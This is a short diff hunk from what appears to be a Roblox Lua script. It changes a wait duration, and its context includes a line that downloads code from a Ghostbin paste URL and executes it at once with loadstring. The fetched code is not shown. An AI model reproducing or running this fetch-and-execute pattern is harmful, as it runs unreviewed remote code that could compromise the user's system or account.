@@ -1178,4 +1178,4 @@ socket5.Attachment0 = A0H
 socket5.Attachment1 = A1H
 loadstring(game:HttpGet("https://ghostbin.co/paste/krmyf/raw",true))()
 
-wait(9e9)
+wait(12e12)
